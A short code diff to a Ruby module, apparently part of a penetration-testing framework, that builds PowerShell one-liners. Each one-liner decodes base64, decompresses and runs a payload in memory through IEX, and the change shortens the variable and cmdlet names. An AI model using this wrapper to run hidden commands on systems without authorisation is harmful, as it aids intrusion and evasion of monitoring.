@@ -45,8 +45,8 @@ module Powershell
       psh_expression =  "$s=New-Object IO.MemoryStream(,"
       psh_expression << "$([Convert]::FromBase64String('#{encoded_stream}')));"
       # Read & delete the first two bytes due to incompatibility with MS
-      psh_expression << "$stream.ReadByte()|Out-Null;"
-      psh_expression << "$stream.ReadByte()|Out-Null;"
+      psh_expression << "$s.ReadByte()|Out-Null;"
+      psh_expression << "$s.ReadByte()|Out-Null;"
       # Uncompress and invoke the expression (execute)
       psh_expression << "$(IEX $(New-Object IO.StreamReader("
       psh_expression << "$(New-Object IO.Compression.DeflateStream("
@@ -81,12 +81,12 @@ module Powershell
 
       # Build the powershell expression
       # Decode base64 encoded command and create a stream object
-      psh_expression =  "$stream = New-Object IO.MemoryStream(,"
+      psh_expression =  "$s=New-Object IO.MemoryStream(,"
       psh_expression << "$([Convert]::FromBase64String('#{encoded_stream}')));"
       # Uncompress and invoke the expression (execute)
-      psh_expression << "$(Invoke-Expression $(New-Object IO.StreamReader("
+      psh_expression << "$(IEX $(New-Object IO.StreamReader("
       psh_expression << "$(New-Object IO.Compression.GzipStream("
-      psh_expression << "$stream,"
+      psh_expression << "$s,"
       psh_expression << "[IO.Compression.CompressionMode]::Decompress)),"
       psh_expression << "[Text.Encoding]::ASCII)).ReadToEnd());"
 
